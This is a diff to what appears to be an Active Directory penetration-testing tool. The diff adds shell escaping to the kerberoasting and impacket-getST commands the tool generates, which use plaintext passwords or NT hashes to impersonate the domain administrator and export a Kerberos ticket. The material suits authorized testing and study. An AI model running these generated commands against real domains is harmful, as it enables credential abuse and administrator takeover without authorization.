@@ -596,14 +596,18 @@ def run(report, store, ui=None):
                     break
             if _kb_hash:
                 break
+    # iter-130: shell-escape kerberoast auth args (' in pw / user survives).
+    _kb_owner_sh = _sh_sq(_kb_owner)
+    _kb_pw_sh = _sh_sq(_kb_pw)
+    _dom_sh_r9 = _sh_sq(dom)
     for u in e.kerberoastable:
         # iter-105: switch to -hashes form when we only have an NT hash.
         # iter-107: single-quote the URI so machine-account names ending in
         # '$' don't get partially-eaten by bash variable expansion. Plaintext
         # form quotes the whole 'dom/user:pw' so ':' + special chars in pw
         # are also safe.
-        _kb_uri = (f"'{dom}/{_kb_owner}'" if _kb_hash
-                   else f"'{dom}/{_kb_owner}:{_kb_pw}'")
+        _kb_uri = (f"'{_dom_sh_r9}/{_kb_owner_sh}'" if _kb_hash
+                   else f"'{_dom_sh_r9}/{_kb_owner_sh}:{_kb_pw_sh}'")
         _kb_hash_flag = (f" -hashes 'aad3b435b51404eeaad3b435b51404ee:{_kb_hash}'"
                          if _kb_hash else "")
         chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
@@ -912,12 +916,13 @@ def run(report, store, ui=None):
                     # blank LM = aad3b435b51404eeaad3b435b51404ee; leading ':'
                     # form is accepted too but the explicit blank-LM form is
                     # clearest for the operator.
+                    # iter-130: shell-escape ulc/pw for getST URI.
                     (f"impacket-getST -spn '{first_spn}' -impersonate administrator "
                      f"-dc-ip {_dc_c} -hashes 'aad3b435b51404eeaad3b435b51404ee:{pw[1:]}' "
-                     f"'{_dom_c}/{ulc}'"
+                     f"'{_sh_sq(_dom_c)}/{_sh_sq(ulc)}'"
                      if pw.startswith(":") else
                      f"impacket-getST -spn '{first_spn}' -impersonate administrator "
-                     f"-dc-ip {_dc_c} '{_dom_c}/{ulc}:{pw}'"),
+                     f"-dc-ip {_dc_c} '{_sh_sq(_dom_c)}/{_sh_sq(ulc)}:{_sh_sq(pw)}'"),
                     f"export KRB5CCNAME=administrator.ccache",
                     *_followup,
                 ], src=best_src, line=best_line))
